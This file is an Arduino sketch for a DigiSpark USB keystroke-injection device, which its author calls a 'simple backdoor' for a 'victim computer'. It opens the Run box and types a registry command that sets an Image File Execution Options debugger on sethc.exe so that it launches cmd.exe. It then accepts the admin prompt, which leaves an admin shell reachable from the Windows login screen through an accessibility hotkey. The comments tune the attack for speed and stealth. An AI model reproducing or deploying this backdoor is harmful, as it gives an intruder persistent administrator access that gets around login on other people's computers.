//By 8figurealltimepro
// Simple backdoor - needs admin privilege 
// Run this script when the victim computer is turned on.Later you can spawn an admin cmd on the login screen by alt+shift+printscreen
// PS the script replaces high contrast feature with the cmd. Not the sticky keys because I have seen many people turn off sticky keys while gaming and so on.
// As always increase the delay if needed
#include "DigiKeyboard.h"
#define KEY_ARROW_LEFT 0x50
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_UP 0x52
#define KEY_TAB 0x2b
#define KEY_ESCAPE 0x29
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd /C mode con: cols=15 lines=1 && reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f "); //starting admin cmd using /C as in close the cmd and then replaing cmd.exe to high contrast. so basically shoul take less than 2 seconds if the delays are reducd even more
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(200);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
